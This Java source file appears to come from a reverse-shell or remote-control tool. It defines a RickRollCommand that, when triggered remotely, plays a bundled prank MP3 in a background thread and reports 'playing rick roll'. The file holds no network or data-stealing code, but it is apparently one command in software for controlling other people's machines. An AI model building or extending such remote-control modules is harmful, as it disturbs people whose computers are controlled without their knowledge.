package com.mtattab.reverseshell.service.commands;

import com.mtattab.reverseshell.model.CommandRestOutput;
import com.mtattab.reverseshell.service.Command;
import javazoom.jl.decoder.Bitstream;
import javazoom.jl.decoder.JavaLayerException;
import javazoom.jl.player.advanced.AdvancedPlayer;

import java.io.InputStream;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class RickRollCommand implements Command {
    private static AdvancedPlayer player;
    private static boolean playing;




    public static void play() {
        try {
            // Load the MP3 file from the classpath
            InputStream inputStream = RickRollCommand.class.getResourceAsStream("/rick-roll-bass-boosted.mp3");

            if (inputStream == null) {
                System.err.println("MP3 file not found in the classpath.");
                return;
            }

            player = new AdvancedPlayer(inputStream);

            new Thread(() -> {
                try {
                    player.play();
                } catch (JavaLayerException e) {
                    e.printStackTrace();
                }
            }).start();

            playing = true;
        } catch (JavaLayerException e) {
            e.printStackTrace();
        }
    }




    @Override
    public String executeCommand(String command) {
        ExecutorService executor = Executors.newSingleThreadExecutor();
        executor.submit(() -> {
            play();

        });
        executor.shutdown();

        return "playing rick roll" ;
    }
}
